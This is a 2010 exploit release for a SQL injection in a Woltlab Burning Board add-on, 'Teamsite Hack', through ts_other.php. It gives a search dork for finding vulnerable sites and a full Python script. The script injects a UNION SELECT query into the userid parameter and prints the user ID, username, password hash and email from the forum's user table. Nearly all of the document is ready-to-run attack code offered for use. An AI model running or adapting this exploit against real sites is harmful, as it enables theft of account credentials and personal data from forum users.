----------------------------Information-----------------------------------------------------
+Name : Woltlab Burning Board Teamsite Hack V3.0 ts_other.php SQL Injection Exploit (Python)
+Autor : Easy Laster
+Date   : 21.03.2010
+Script  : Woltlab Burning Board Teamsite Hack V3.0
+Google Door : Teamsite Hack V3.0 by Blue -- Robis-Forum
+Download : http://www.robertotto.de/
+Price : Woltlab Burning  Board Lizenz
+Language :PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr Chaos,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne.

---------------------------------------------------------------------------------------------

 ___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|


---------------------------------------------------------------------------------------------
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys, urllib2, re

if len(sys.argv) < 2:
    print "***************************************************************"
    print "*****Woltlab Board Burning Board Teamsite Hack V2.0 ***********"
    print "***************************************************************"
    print "*          Discovered and vulnerability by Easy Laster        *"
    print "*                      coded by Dr.ChAoS                      *"
    print "*                                                             *"
    print "*                          <=Usage=>                          *"
    print "* python exploit.py http://site.de/forum/ <userid, default=1> *"
    print "*                                                             *"
    print "***************************************************************"
    exit()

if len(sys.argv) < 3:
    id = 1
else:
    id = sys.argv[2]

forum = sys.argv[1]
if forum[-1:] != "/":
    forum += "/"

urlPart1 = forum + "ts_other.php?action=modboard&userid=1111111'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,concat(userid,0x3a,username,0x3a,password,0x3a,email),24,23,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55"
urlPart2 = "+from+bb1_users+where+userid=" + str(id) + "--+"
columns = ""

print "Exploiting..."

for i in range(10):
    html = urllib2.urlopen(urlPart1 + columns + urlPart2).read()
    ##I hate regex!
    res = re.findall(r">([1-9])\:(.*)\:(.*)<", html)
    if len(res) > 0:
        userID = res[0][0]
        userData = res[0][1].rsplit(":", 1)
        email = res[0][2].split("<")[0]
        print "Success!\n"
        print "ID: " + str(userID)
        print "Username: " + userData[0]
        print "Password: " + userData[1]
        print "E-Mail: " + str(email)
        print "\nHave a nice day!"
        exit()
    columns += ",1"

print "Exploit failed..."